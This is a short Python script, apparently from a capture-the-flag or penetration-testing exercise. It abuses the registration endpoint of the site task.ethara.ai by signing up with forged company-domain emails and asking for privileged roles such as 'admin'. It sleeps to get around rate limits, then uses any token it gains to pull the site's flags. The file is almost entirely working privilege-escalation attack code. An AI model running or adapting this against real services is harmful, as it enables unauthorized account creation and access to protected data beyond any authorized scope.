#!/usr/bin/env python3
"""
Final test with ethara.ai email
"""

import requests
import time

BASE_URL = "https://task.ethara.ai"

print("[*] Testing with @ethara.ai email...")

# Wait a bit to avoid rate limit
time.sleep(65)

roles = ["tasker", "qr", "ql", "pl", "admin"]

for role in roles:
    print(f"\n[*] Trying role: {role} with @ethara.ai email")
    try:
        resp = requests.post(f"{BASE_URL}/api/auth/register", json={
            "email": f"test_{role}@ethara.ai",
            "password": "Test123!@#$%",
            "name": f"Test {role}",
            "role": role
        }, timeout=10)
        print(f"  Status: {resp.status_code}")
        print(f"  Response: {resp.text[:1000]}")
        
        if resp.status_code in [200, 201]:
            data = resp.json()
            if 'access_token' in data:
                token = data['access_token']
                print(f"\n  [+] SUCCESS! Got token")
                
                headers = {"Authorization": f"Bearer {token}"}
                
                # Try to get flags
                print(f"\n  [*] Getting flags...")
                resp2 = requests.get(f"{BASE_URL}/api/flags", headers=headers)
                print(f"    Status: {resp2.status_code}")
                if resp2.status_code == 200:
                    print(f"    FLAGS: {resp2.text}")
                
                break
        
        time.sleep(2)  # Avoid rate limit
        
    except Exception as e:
        print(f"  Error: {e}")

print("\n[*] Test complete!")
